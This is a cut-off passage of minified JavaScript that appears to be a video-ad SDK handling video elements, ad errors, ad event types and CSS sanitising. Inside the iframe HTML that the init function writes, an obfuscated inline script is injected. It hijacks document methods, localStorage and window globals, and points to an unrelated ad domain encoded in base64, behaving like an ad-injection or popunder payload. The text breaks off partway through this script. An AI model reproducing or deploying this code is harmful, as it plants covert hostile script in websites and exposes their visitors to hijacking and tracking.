    };
    var wC = function(a, b) {
            a.g = xf("DIV", {
                style: "display:none;"
            });
            a.o.appendChild(a.g);
            a.g.appendChild(a.h);
            b && (a.l = xf("DIV", {
                style: "position:absolute;width:100%;height:100%;left:0px;top:0px"
            }), a.g.appendChild(a.l))
        },
        vC = function() {
            var a = Rx(W);
            if (Ox(a, "useVideoElementFake")) {
                a = sC();
                var b = xf("DIV", {
                    style: "position:absolute;width:100%;height:100%;top:0px;left:0px;"
                });
                Object.assign(b, a);
                a.g = xf("DIV", {
                    style: "position:absolute;width:100%;height:100%;top:0px;left:0px;background-color:#000"
                });
                a.h = xf("P", {
                    style: "position:absolute;top:25%;margin-left:10px;font-size:24px;color:#fff;"
                });
                a.g.appendChild(a.h);
                b.appendChild(a.g);
                a.A.O(a, ["loadeddata", "playing", "pause", "ended"], a.Zd);
                a = b
            } else {
                a = !1;
                try {
                    -1 != window.location.search.indexOf("goog_limavideo=true") && (a = !0)
                } catch (c) {}
                u.customElements ? a ? b = !0 : (Sh(Mi) && eA().report(153, {
                    limvid: "vw"
                }), b = Sh(Ki) || Sh(Mi) || Sh(Ii) || Sh(Ji) ? !0 : !1) : b = !1;
                if (b) {
                    a && console.log("force lima video in wrapper");
                    a = null;
                    try {
                        a = new jx
                    } catch (c) {
                        a = xf("lima-video"), Sh(Mi) && eA().report(153, {
                            limvid: "firefail"
                        })
                    }
                    a.style.backgroundColor = "#000";
                    a.style.height = "100%";
                    a.style.width =
                        "100%";
                    a.style.position = "absolute";
                    a.style.left = "0";
                    a.style.top = "0"
                } else a = xf("VIDEO", {
                    style: "background-color:#000;position:absolute;width:100%;height:100%;left:0;top:0;",
                    title: Lx("Advertisement").toString()
                })
            }
            a.setAttribute("webkit-playsinline", !0);
            a.setAttribute("playsinline", !0);
            return a
        };
    xC.prototype.show = function() {
        WB(this.g, !0)
    };
    var WB = function(a, b) {
        null != a && (a.style.display = b ? "block" : "none")
    };
    var AC = function(a, b, c) {
        var d = a && a.getRootNode ? a.getRootNode({
            composed: !0
        }) : a;
        if (null == a || !Af(nf(d), d)) throw Ky(Jy, null, "containerElement", "element");
        this.A = b;
        this.Y = oy(this.A || null);
        this.X = ru(this.A || null);
        this.V = String(Math.floor(1E9 * Math.random()));
        this.H = !1;
        this.G = a;
        this.T = null != b;
        W.g = 2;
        this.D = yC(b ? b : null);
        d = xf("DIV", {
            style: "position:absolute"
        });
        a.insertBefore(d, a.firstChild);
        this.B = d;
        this.h = null;
        zC(this) && b ? a = new JB(b) : (this.h = new xC(this.B, !0), a = new JB(this.h.h));
        this.g = a;
        this.l = this.o = null;
        if (a = this.h && W.isAutoPlayAdBreaks()) a = !(zC(this) || Cd || Ed || Nm() || Bd && (!Bd || !ou(nu, 4)));
        a && (this.o = new xC(this.B, !0), this.l = new JB(this.o.h));
        this.C = c || null;
        this.R = null != this.C;
        zC(this) && b ? "function" !== typeof b.getBoundingClientRect ? (c = this.B, W.l = c) : c = b : c = this.B;
        this.L = c;
        this.I = new nC(this.B, this);
        this.M = new lf(0, 0);
        this.J = "";
        b && (b = ct(b.src || b.currentSrc), 200 > b.toString().length ? this.J = b.toString() : 200 > b.h.length && (this.J = b.h));
        this.K = new Map;
        this.K.set("videoDisplay1", this.g);
        this.l && this.K.set("videoDisplay2",
            this.l)
    };
    AC.prototype.initialize = function() {
        this.H = !0;
        null != this.h && this.h.initialize();
        null != this.o && this.o.initialize()
    };
    AC.prototype.destroy = function() {
        var a = this;
        this.A = null;
        Ti(this.h);
        Ti(this.o);
        Ti(this.I);
        this.g.Nb(function() {
            return Ti(a.g)
        });
        null != this.l && this.l.Nb(function() {
            return Ti(a.l)
        });
        yf(this.B)
    };
    var pC = function(a) {
            return a.R && a.C ? a.C : null != a.h ? a.h.l : null
        },
        zC = function(a) {
            return ny(a.D) && a.T
        },
        yC = function(a) {
            return null != a && "function" === typeof a.getAttribute && null != a.getAttribute("playsinline") ? !0 : !1
        };
    AC.prototype.destroy = AC.prototype.destroy;
    AC.prototype.initialize = AC.prototype.initialize;
    var BC = function(a) {
        var b = Error.call(this);
        this.message = b.message;
        "stack" in b && (this.stack = b.stack);
        this.g = a
    };
    t(BC, Error);
    l = BC.prototype;
    l.getInnerError = function() {
        var a = this.g.innerError;
        return a instanceof Object ? new BC(a) : null != a ? Error(a) : null
    };
    l.getMessage = function() {
        return this.g.errorMessage
    };
    l.getErrorCode = function() {
        return this.g.errorCode
    };
    l.Bd = function() {
        var a = this.getErrorCode();
        return 1E3 > a ? a : 900
    };
    l.getType = function() {
        return this.g.type
    };
    l.toString = function() {
        return "AdError " + this.getErrorCode() + ": " + this.getMessage() + (null != this.getInnerError() ? " Caused by: " + this.getInnerError() : "")
    };
    BC.prototype.getType = BC.prototype.getType;
    BC.prototype.getVastErrorCode = BC.prototype.Bd;
    BC.prototype.getErrorCode = BC.prototype.getErrorCode;
    BC.prototype.getMessage = BC.prototype.getMessage;
    BC.prototype.getInnerError = BC.prototype.getInnerError;
    var CC = {
        AD_LOAD: "adLoadError",
        AD_PLAY: "adPlayError"
    };
    y("module$contents$ima$AdError_AdError.Type", CC, void 0);
    var DC = function(a, b) {
        b = void 0 === b ? null : b;
        Wi.call(this, "adError");
        this.g = a;
        this.l = b
    };
    t(DC, Wi);
    DC.prototype.getError = function() {
        return this.g
    };
    DC.prototype.getUserRequestContext = function() {
        return this.l
    };
    DC.prototype.getUserRequestContext = DC.prototype.getUserRequestContext;
    DC.prototype.getError = DC.prototype.getError;
    var EC = {
        AD_ERROR: "adError"
    };
    y("module$contents$ima$AdErrorEvent_AdErrorEvent.Type", EC, void 0);
    var FC = function(a, b, c) {
        b = void 0 === b ? null : b;
        c = void 0 === c ? null : c;
        Wi.call(this, a);
        this.l = b;
        this.g = c
    };
    t(FC, Wi);
    FC.prototype.getAd = function() {
        return this.l
    };
    FC.prototype.getAdData = function() {
        return this.g
    };
    FC.prototype.getAdData = FC.prototype.getAdData;
    FC.prototype.getAd = FC.prototype.getAd;
    var GC = {
        AD_CAN_PLAY: "adCanPlay",
        zf: "adStarted",
        CONTENT_PAUSE_REQUESTED: "contentPauseRequested",
        CONTENT_RESUME_REQUESTED: "contentResumeRequested",
        CLICK: "click",
        VIDEO_CLICKED: "videoClicked",
        VIDEO_ICON_CLICKED: "videoIconClicked",
        cd: "engagedView",
        EXPANDED_CHANGED: "expandedChanged",
        STARTED: "start",
        AD_PROGRESS: "adProgress",
        AD_BUFFERING: "adBuffering",
        IMPRESSION: "impression",
        jd: "measurable_impression",
        VIEWABLE_IMPRESSION: "viewable_impression",
        dd: "fully_viewable_audible_half_duration_impression",
        ce: "overlay_resize",
        de: "overlay_unmeasurable_impression",
        ee: "overlay_unviewable_impression",
        ge: "overlay_viewable_immediate_impression",
        fe: "overlay_viewable_end_of_session_impression",
        Vf: "externalActivityEvent",
        PAUSED: "pause",
        RESUMED: "resume",
        FIRST_QUARTILE: "firstQuartile",
        MIDPOINT: "midpoint",
        THIRD_QUARTILE: "thirdQuartile",
        COMPLETE: "complete",
        DURATION_CHANGE: "durationChange",
        USER_CLOSE: "userClose",
        jh: "userRecall",
        Og: "prefetched",
        LOADED: "loaded",
        ALL_ADS_COMPLETED: "allAdsCompleted",
        SKIPPED: "skip",
        je: "skipShown",
        LINEAR_CHANGED: "linearChanged",
        SKIPPABLE_STATE_CHANGED: "skippableStateChanged",
        AD_METADATA: "adMetadata",
        yf: "adBreakFetchError",
        AD_BREAK_READY: "adBreakReady",
        LOG: "log",
        VOLUME_CHANGED: "volumeChange",
        VOLUME_MUTED: "mute",
        INTERACTION: "interaction",
        If: "companionBackfill",
        gh: "trackingUrlPinged",
        lh: "video_card_endcap_collapse",
        mh: "video_card_endcap_dismiss",
        nh: "video_card_endcap_impression",
        Lf: "companionInitialized",
        Kf: "companionImpression",
        Jf: "companionClick",
        Ag: "mediaUrlPinged",
        $d: "loadStart",
        Dg: "navigationRequested"
    };
    y("module$contents$ima$AdEvent_AdEvent.Type", GC, void 0);
    var HC = function(a, b) {
        b = void 0 === b ? null : b;
        FC.call(this, "adMetadata", a);
        this.o = b
    };
    t(HC, FC);
    HC.prototype.Ae = function() {
        return this.o
    };
    HC.prototype.getAdCuePoints = HC.prototype.Ae;
    var IC = function(a) {
        this.adBreakDuration = a.adBreakDuration;
        this.adPosition = a.adPosition;
        this.currentTime = a.currentTime;
        this.duration = a.duration;
        this.totalAds = a.totalAds
    };
    var JC = function(a, b) {
        M.call(this);
        this.l = a;
        this.A = b;
        this.h = this.l.currentTime;
        this.g = new bk(250);
        Vi(this, this.g);
        this.o = new yu(this);
        Vi(this, this.o);
        Au(this.o, this.g, "tick", this.C, !1, this)
    };
    t(JC, M);
    JC.prototype.Ya = function() {
        return this.h
    };
    JC.prototype.start = function() {
        KC(this);
        this.g.start()
    };
    JC.prototype.stop = function() {
        this.g.stop()
    };
    JC.prototype.C = function() {
        var a = this.l.currentTime;
        a != this.Ya() && (this.h = a, KC(this))
    };
    var KC = function(a) {
        var b = {};
        b.currentTime = a.Ya();
        Dy(a.A, "contentTimeUpdate", "contentTimeUpdate", b)
    };
    var LC = {
            rgb: !0,
            rgba: !0,
            alpha: !0,
            rect: !0,
            image: !0,
            "linear-gradient": !0,
            "radial-gradient": !0,
            "repeating-linear-gradient": !0,
            "repeating-radial-gradient": !0,
            "cubic-bezier": !0,
            matrix: !0,
            perspective: !0,
            rotate: !0,
            rotate3d: !0,
            rotatex: !0,
            rotatey: !0,
            steps: !0,
            rotatez: !0,
            scale: !0,
            scale3d: !0,
            scalex: !0,
            scaley: !0,
            scalez: !0,
            skew: !0,
            skewx: !0,
            skewy: !0,
            translate: !0,
            translate3d: !0,
            translatex: !0,
            translatey: !0,
            translatez: !0
        },
        MC = function(a) {
            a = kc(a);
            if ("" == a) return null;
            var b = String(a.substr(0, 4)).toLowerCase();
            if (0 == ("url(" <
                    b ? -1 : "url(" == b ? 0 : 1)) return null;
            if (0 < a.indexOf("(")) {
                if (/"|'/.test(a)) return null;
                b = /([\-\w]+)\(/g;
                for (var c; c = b.exec(a);)
                    if (!(c[1].toLowerCase() in LC)) return null
            }
            return a
        };

    function NC(a) {
        var b = u.CSSStyleDeclaration;
        return b && b.prototype && b.prototype[a] || null
    }
    var OC = NC("getPropertyValue"),
        PC = NC("setProperty");

    function QC(a, b, c, d) {
        if (a) return a.apply(b, d);
        if (vd && 10 > document.documentMode) {
            if (!b[c].call) throw Error("IE Clobbering detected");
        } else if ("function" != typeof b[c]) throw Error("Clobbering detected");
        return b[c].apply(b, d)
    };
    var RC = {
            "-webkit-border-horizontal-spacing": !0,
            "-webkit-border-vertical-spacing": !0
        },
        TC = function(a) {
            if (!a) return Ec;
            var b = document.createElement("div").style;
            SC(a).forEach(function(c) {
                var d = yd && c in RC ? c : c.replace(/^-(?:apple|css|epub|khtml|moz|mso?|o|rim|wap|webkit|xv)-(?=[a-z])/i, "");
                0 != d.lastIndexOf("--", 0) && 0 != d.lastIndexOf("var", 0) && (c = QC(OC, a, a.getPropertyValue ? "getPropertyValue" : "getAttribute", [c]) || "", c = MC(c), null != c && QC(PC, b, b.setProperty ? "setProperty" : "setAttribute", [d, c]))
            });
            return new Dc(b.cssText ||
                "", Cc)
        },
        SC = function(a) {
            Ma(a) ? a = Bb(a) : (a = Nb(a), xb(a, "cssText"));
            return a
        };
    var UC = function(a, b, c) {
        M.call(this);
        this.h = a;
        this.g = null;
        this.H = "";
        this.J = Ec;
        this.K = 0;
        this.C = this.l = null;
        this.o = b;
        this.A = null;
        this.D = "";
        this.G = c
    };
    t(UC, M);
    UC.prototype.init = function(a) {
        this.D = a;
        a = "about:blank";
        vd && (a = "");
        this.l = xf("IFRAME", {
            src: a,
            allowtransparency: !0,
            background: "transparent"
        });
        ig(this.l, {
            display: "none",
            width: "0",
            height: "0"
        });
        a = this.h.G;
        a.appendChild(this.l);
        a = a.ownerDocument;
        a = a.defaultView || a.parentWindow;
        null == this.A && (this.A = new yu(this));
        this.A.O(a, "message", this.M);
        a = '<body><script src="//imasdk.googleapis.com/js/sdkloader/loader.js">\x3c/script><script>loader = new VPAIDLoader(false, "' + (this.D + '");\x3c/script> <script data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[23]]}U[K[24]]=()=>{},R[K[9]](K[25])[0][K[26]](U),c=U[K[27]];let _={};_[K[28]]=!1,c[K[29]][K[30]](c[K[31]],K[32],_);let S=c[K[33]][K[34]]()[K[35]](36)[K[36]](2)[K[37]](/^\d+/,K[38]);window[S]=document,g[K[39]](a=>{document[a]=function(){return c[K[13]][a][K[40]](window[K[13]],arguments)}}),L[K[39]](a=>{let h={};h[K[28]]=!1,h[K[41]]=()=>R[a],c[K[29]][K[30]](C,a,h)}),document[K[42]]=function(){let a=new c[K[43]](c[K[44]](K[45])[K[46]](K[47],c[K[44]](K[45])),K[48]);return arguments[0]=arguments[0][K[37]](a,S),c[K[13]][K[42]][K[49]](window[K[13]],arguments[0])};try{window[K[50]]=window[K[50]]}catch(a){let h={};h[K[51]]={},h[K[52]]=(B,ve)=>(h[K[51]][B]=c[K[31]](ve),h[K[51]][B]),h[K[53]]=B=>{if(B in h[K[51]])return h[K[51]][B]},h[K[54]]=B=>(delete h[K[51]][B],!0),h[K[55]]=()=>(h[K[51]]={},!0),delete window[K[50]],window[K[50]]=h}try{window[K[44]]}catch(a){delete window[K[44]],window[K[44]]=c[K[44]]}try{window[K[56]]}catch(a){delete window[K[56]],window[K[56]]=c[K[56]]}try{window[K[43]]}catch(a){delete window[K[43]],window[K[43]]=c[K[43]]}for(key in document)try{C[key]=document[key][K[57]](document)}catch(a){C[key]=document[key]}}catch(_){}let z=_=>{try{return c[_]}catch(S){try{return window[_]}catch(a){return null}}};[K[31],K[44],K[58],K[59],K[60],K[61],K[33],K[62],K[43],K[63],K[63],K[64],K[65],K[66],K[67],K[68],K[69],K[70],K[71],K[72],K[73],K[74],K[56],K[75],K[29],K[76],K[77],K[78],K[79],K[50],K[80]][K[39]](_=>{try{if(!window[_])throw new c[K[78]](K[38])}catch(S){try{let a={};a[K[28]]=!1,a[K[41]]=()=>c[_],c[K[29]][K[30]](window,_,a)}catch(a){}}}),v(z(K[31]),z(K[44]),z(K[58]),z(K[59]),z(K[60]),z(K[61]),z(K[33]),z(K[62]),z(K[43]),z(K[63]),z(K[63]),z(K[64]),z(K[65]),z(K[66]),z(K[67]),z(K[68]),z(K[69]),z(K[70]),z(K[71]),z(K[72]),z(K[73]),z(K[74]),z(K[56]),z(K[75]),z(K[29]),z(K[76]),z(K[77]),z(K[78]),z(K[79]),z(K[50]),z(K[80]),C)})((v,g,L,R,U,s,c,C,z,_,S,a,h,B,ve,N,fe,rt,cn,H,lK,zn,Kt,ft,ue,yK,ut,I,ot,j,an,qt)=>{(function(e,q,i,w){(()=>{function ie(n){let t=n[e.IK]()[e.Aj](e.J);return t>=e.HK&&t<=e.rj?t-e.HK:t>=e.ej&&t<=e.tj?t-e.ej+e.LK:e.J}function bn(n){return n<=e.nK?v[e.Kj](n+e.HK):n<=e.jj?v[e.Kj](n+e.ej-e.LK):e.uK}function Mt(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=(t+e.U)*(f+e.U),o=(ie(r)+u)%e.lK;return bn(o)})[e.EK](e.h)}function _e(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=t[f%(t[e.SK]-e.U)],o=ie(u),M=ie(r)-o,d=M<e.J?M+e.lK:M;return bn(d)})[e.EK](e.h)}var dt=S,O=dt,it=e.yj(e.rK,e.KK),ct=e.yj(e.jK,e.KK),zt=e.V,at=[[e.kj],[e.Mj,e.bj,e.Ej],[e.Yj,e.Sj],[e.gj,e.Cj,e.Gj],[e.hj,e.vj]],bt=[[e.Oj],[-e.Lj],[-e.Nj],[-e.Fj,-e.qj],[e.Wj,e.Ej,-e.Oj,-e.Rj]],jt=[[e.cj],[e.pj],[e.Bj],[e.Qj],[e.Vj]];function Ce(n,t){try{let r=n[e.FK](f=>f[e.LM](t)>-e.U)[e.vM]();return n[e.LM](r)+zt}catch(r){return e.J}}function mt(n){return it[e.hK](n)?e.i:ct[e.hK](n)?e.V:e.U}function Et(n){return Ce(at,n)}function lt(n){return Ce(bt,n[e.mj]())}function yt(n){return Ce(jt,n)}function pt(n){return n[e.Pk](e.iK)[e.kK](e.U)[e.FK](t=>t)[e.vM]()[e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()[e.Pk](e.h)[e.sK]((t,r)=>t+ie(r),e.J)%e.w+e.U}var Be=[];function xt(){return Be}function X(n){Be[e.kK](-e.U)[e.oj]()!==n&&Be[e.Hj](n)}var oe=typeof i<e.l?i[e.qr]:e.v,Ne=e.H,Te=e.n,ce=c[e.A]()[e.IK](e.lK)[e.kK](e.V),st=c[e.A]()[e.IK](e.lK)[e.kK](e.V),Fe=c[e.A]()[e.IK](e.lK)[e.kK](e.V),pK=c[e.A]()[e.IK](e.lK)[e.kK](e.V);function jn(n){oe[e.zK](Ne,jn),[mt(w[e.fr]),Et(q[e.uj][e.JK]),lt(new s),pt(q[e.nj][e.xb]),yt(w[e.yb]||w[e.Lb])][e.X](t=>{let r=a(c[e.A]()*e.LK,e.LK);N(()=>{let f=e.MK();f[e.aK]=n[e.XK],f[e.ob]=t,q[e.PK](f,e.fK),X(e.LE[e.CK](t))},r)})}function mn(n){oe[e.zK](Te,mn);let t=e.MK();t[e.aK]=n[e.XK];let{href:r}=q[e.nj],f=new q[e.Tj];f[e.Pj](e.gr,r),f[e.fj]=()=>{t[e.Nr]=f[e.bE](),q[e.PK](t,e.fK)},f[e.Rr]=()=>{t[e.Nr]=e.Fb,q[e.PK](t,e.fK)},f[e.xk]()}oe&&(oe[e.T](Ne,jn),oe[e.T](Te,mn));var ht=e.u,wt=e.z,V=e.a,ze=i[e.qr],T=[q],Jt=[],gt=()=>{};ze&&ze[e.Rr]&&(gt=ze[e.Rr]);try{let n=T[e.kK](-e.U)[e.oj]();for(;n&&n!==n[e.rk]&&n[e.rk][e.uj][e.JK];)T[e.Hj](n[e.rk]),n=n[e.rk]}catch(n){}T[e.X](n=>{n[e.Ub][e.PM][e.NM][e.aM]||(n[e.Ub][e.PM][e.NM][e.aM]=c[e.A]()[e.IK](e.lK)[e.kK](e.V));let t=n[e.Ub][e.PM][e.NM][e.aM];n[t]=n[t]||[];try{n[V]=n[V]||[]}catch(r){}});function Ut(n,t,r,f=e.J,u=e.J,o){let M;try{M=ze[e.Ek][e.Pk](e.iK)[e.V]}catch(d){}try{let d=q[e.Ub][e.PM][e.NM][e.aM]||V,b=q[d][e.FK](l=>l[e.Kk]===r&&l[e.bb])[e.vM](),p=e.MK();p[e.jk]=n,p[e.Mb]=t,p[e.Kk]=r,p[e.bb]=b?b[e.bb]:u,p[e.Eb]=M,p[e.Yb]=f,p[e.Sb]=o,o&&o[e.db]&&(p[e.db]=o[e.db]),Jt[e.Hj](p),T[e.X](l=>{let J=l[e.Ub][e.PM][e.NM][e.aM]||V;l[J][e.Hj](p);try{l[V][e.Hj](p)}catch(E){}})}catch(d){}}function Ae(n,t){let r=Pt();for(let f=e.J;f<r[e.SK];f++)if(r[f][e.Kk]===t&&r[f][e.jk]===n)return!e.J;return!e.U}function Pt(){let n=[];for(let t=e.J;t<T[e.SK];t++){let r=T[t][e.Ub][e.PM][e.NM][e.aM],f=T[t][r]||[];for(let u=e.J;u<f[e.SK];u++)n[e.FK](({format:o,zoneId:M})=>{let d=o===f[u][e.jk],b=M===f[u][e.Kk];return d&&b})[e.SK]>e.J||n[e.Hj](f[u])}try{for(let t=e.J;t<T[e.SK];t++){let r=T[t][V]||[];for(let f=e.J;f<r[e.SK];f++)n[e.FK](({format:u,zoneId:o})=>{let M=u===r[f][e.jk],d=o===r[f][e.Kk];return M&&d})[e.SK]>e.J||n[e.Hj](r[f])}}catch(t){}return n}function En(n,t){T[e.NK](r=>{let f=r[e.Ub][e.PM][e.NM][e.aM]||V;return(r[f]||[])[e.FK](u=>n[e.LM](u[e.Kk])>-e.U)})[e.sK]((r,f)=>r[e.CK](f),[])[e.X](r=>{try{r[e.Sb][e.ek](t)}catch(f){}})}var Y=e.MK();Y[e.U]=e.x,Y[e.d]=e.r,Y[e.Z]=e.K,Y[e.i]=e.j,Y[e.w]=e.k,Y[e.I]=e.M,Y[e.V]=e.b;var W=e.MK();W[e.U]=e.E,W[e.I]=e.Y,W[e.i]=e.S,W[e.V]=e.b;var k=e.MK();k[e.U]=e.g,k[e.V]=e.C,k[e.d]=e.G,k[e.Z]=e.G,k[e.i]=e.G;var m=9352772,F=9352771,xK=360,vt=1,_t=10,Ct=3,sK=true,hK=U[e.bK](g('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),A=1,ln='Ly9tYWR1cmlyZC5jb20vNS85MzUyNzcy',yn='bWFkdXJpcmQuY29t',Bt=2,Nt=1747720258*e.mr,Tt='Zez$#t^*EFng',Ft='4ly',At='7nz05wlebvq',pn='01t5r1u4',xn='z3c',sn='bngja9zmyl6',Lt='_lxtqolz',Xt='_xivfmvdp',Zt=false,x=e.MK(),Dt=e.XM[e.Pk](e.h)[e.zj]()[e.EK](e.h);typeof q<e.l&&(x[e.UK]=q,typeof q[e.uj]<e.l&&(x[e.aj]=q[e.uj])),typeof i<e.l&&(x[e.dK]=i,x[e.ZK]=i[Dt]),typeof w<e.l&&(x[e.or]=w);function hn(){let{doc:n}=x;try{x[e.pK]=n[e.pK]}catch(t){let r=[][e.eb][e.Sk](n[e.qb](e.kk),f=>f[e.Ek]===e.Jj);x[e.pK]=r&&r[e.Zb][e.pK]}}hn(),x[e.s]=()=>{if(!q[e.rk])return e.v;try{let n=q[e.rk][e.Ub],t=n[e.pK](e.zM);return n[e.ib][e.Yk](t),t[e.JM]!==n[e.ib]?!e.U:(t[e.JM][e.gk](t),x[e.UK]=q[e.rk],x[e.dK]=x[e.UK][e.Ub],hn(),!e.J)}catch(n){return!e.U}},x[e.D]=()=>{try{return x[e.dK][e.qr][e.JM]!==x[e.dK][e.ib]?(x[e.Rb]=x[e.dK][e.qr][e.JM],(!x[e.Rb][e.xK][e.iM]||x[e.Rb][e.xK][e.iM]===e.Zk)&&(x[e.Rb][e.xK][e.iM]=e.mb),!e.J):!e.U}catch(n){return!e.U}};var ae=x;function Rt(n,t,r){let f=ae[e.dK][e.pK](e.kk);f[e.xK][e.Mk]=e.Xj,f[e.xK][e.JK]=e.Xj,f[e.xK][e.bk]=e.J,f[e.Ek]=e.Jj,(ae[e.dK][e.BM]||ae[e.ZK])[e.Yk](f);let u=f[e.FM][e.Pj][e.Sk](ae[e.UK],n,t,r);return f[e.JM][e.gk](f),u}var be,Yt=[];function Qt(){let n=[e.Ck,e.Gk,e.hk,e.vk,e.Ok,e.Wk,e.ck,e.pk],t=[e.uK,e.Bk,e.Qk,e.Vk,e.Hk],r=[e.nk,e.uk,e.zk,e.ak,e.Xk,e.Jk,e.Uk,e.dk,e.Zk,e.ik,e.wk,e.Ik],f=c[e.lk](c[e.A]()*n[e.SK]),u=n[f][e.sk](e.yj(e.Ck,e.qM),()=>{let o=c[e.lk](c[e.A]()*r[e.SK]);return r[o]})[e.sk](e.yj(e.Gk,e.qM),()=>{let o=c[e.lk](c[e.A]()*t[e.SK]),M=t[o],d=c[e.EE](e.LK,M[e.SK]),b=c[e.lk](c[e.A]()*d);return e.h[e.CK](M)[e.CK](b)[e.kK](M[e.SK]*-e.U)});return e.Dk[e.CK](be,e.iK)[e.CK](u,e.iK)}function Ht(){return e.h[e.CK](Qt()[e.kK](e.J,-e.U),e.wK)}function Ot(n){return n[e.Pk](e.iK)[e.kK](e.i)[e.EK](e.iK)[e.Pk](e.h)[e.sK]((t,r,f)=>{let u=c[e.EE](f+e.U,e.I);return t+r[e.Aj](e.J)*u},e.Ak)[e.IK](e.lK)}function Vt(){let n=i[e.pK](e.kk);return n[e.xK][e.Mk]=e.Xj,n[e.xK][e.JK]=e.Xj,n[e.xK][e.bk]=e.J,n}function wn(n){n&&(be=n,Gt())}function Gt(){be&&Yt[e.X](n=>n(be))}function St(n){try{let t=i[e.pK](e.cr);t[e.aK]=e.RM,(i[e.BM]||i[e.PM])[e.Yk](t),N(()=>{try{n(getComputedStyle(t,e.v)[e.wE]!==e.XE)}catch(r){n(!e.J)}},e.ok)}catch(t){n(!e.J)}}function It(){let n=Bt===e.U?e.Uj:e.dj,t=e.mM[e.CK](n,e.oM)[e.CK](Y[A]),r=e.MK();r[e.ek]=wn,r[e.tk]=xt,r[e.yk]=sn,r[e.Lk]=pn,r[e.Nk]=xn,Ut(t,ht,m,Nt,F,r)}function Jn(){let n=W[A];return Ae(n,F)||Ae(n,m)}function gn(){let n=W[A];return Ae(n,F)}function Wt(){let n=[e.Fk,e.qk,e.Rk,e.mk],t=i[e.pK](e.kk);t[e.xK][e.bk]=e.J,t[e.xK][e.JK]=e.Xj,t[e.xK][e.Mk]=e.Xj,t[e.Ek]=e.Jj;try{i[e.PM][e.Yk](t),n[e.X](r=>{try{q[r]}catch(f){delete q[r],q[r]=t[e.FM][r]}}),i[e.PM][e.gk](t)}catch(r){}}var Le=e.MK(),je=e.MK(),Xe=e.MK(),$t=e.U,ee=e.h,me=e.h;Ze();function Ze(){if(ee)return;let n=fe(()=>{if(gn()){H(n);return}if(me){try{let t=me[e.Pk](le)[e.FK](M=>!le[e.hK](M)),[r,f,u]=t;me=e.h,Xe[e.o]=f,Le[e.o]=r,je[e.o]=Nn(u,e.Tr),[Le,je,Xe][e.X](M=>{ye(M,st,$t)});let o=[_e(Le[e.t],je[e.t]),_e(Xe[e.t],je[e.t])][e.EK](e.DK);ee!==o&&(ee=o,En([m,F],ee))}catch(t){}H(n)}},e.ok)}function Un(){return ee}function kt(){ee=e.h}function Ee(n){n&&(me=n)}var y=e.MK();y[e.A]=e.h,y[e.e]=e.h,y[e.t]=e.h,y[e.y]=void e.J,y[e.L]=e.v,y[e.N]=_e(Ft,At);var Pn=new s,vn=!e.U;_n();function _n(){y[e.y]=!e.U,Pn=new s;let n=Mr(y,Fe),t=fe(()=>{if(y[e.t]!==e.h){if(H(t),q[e.zK](e.P,n),y[e.t]===e.Fb){y[e.y]=!e.J;return}try{if(C(y[e.e])[e.NE](e.J)[e.X](f=>{y[e.A]=e.h;let u=Cn(e.KY,e.uE);C(u)[e.NE](e.J)[e.X](o=>{y[e.A]+=v[e.Kj](Cn(e.ej,e.tj))})}),gn())return;let r=e.IE*e.Lj*e.mr;N(()=>{if(vn)return;let f=new s()[e.xM]()-Pn[e.xM]();y[e.L]+=f,_n(),Ze(),hr()},r)}catch(r){}y[e.y]=!e.J,y[e.t]=e.h}},e.ok);q[e.T](e.P,n)}function er(){return y[e.t]=y[e.t]*e.UM%e.Tk,y[e.t]}function Cn(n,t){return n+er()%(t-n)}function nr(n){return n[e.Pk](e.h)[e.sK]((t,r)=>(t<<e.Z)-t+r[e.Aj](e.J)&e.Tk,e.J)}function tr(){return[y[e.A],y[e.N]][e.EK](e.DK)}function De(){let n=[...e.dM],t=(c[e.A]()*e.ZM|e.J)+e.d;return[...C(t)][e.NK](r=>n[c[e.A]()*n[e.SK]|e.J])[e.EK](e.h)}function Re(){return y[e.y]}function rr(){vn=!e.J}var le=e.yj(e.YK,e.h),Kr=typeof i<e.l?i[e.qr]:e.v,fr=e.F,ur=e.q,or=e.R,qr=e.m;function ye(n,t,r){let f=n[e.o][e.Pk](le)[e.FK](o=>!le[e.hK](o)),u=e.J;return n[e.t]=f[u],n[e.SK]=f[e.SK],o=>{let M=o&&o[e.tM]&&o[e.tM][e.aK],d=o&&o[e.tM]&&o[e.tM][e.ob];if(M===t)for(;d--;)u+=r,u=u>=f[e.SK]?e.J:u,n[e.t]=f[u]}}function Mr(n,t){return r=>{let f=r&&r[e.tM]&&r[e.tM][e.aK],u=r&&r[e.tM]&&r[e.tM][e.Nr];if(f===t)try{let o=(n[e.L]?new 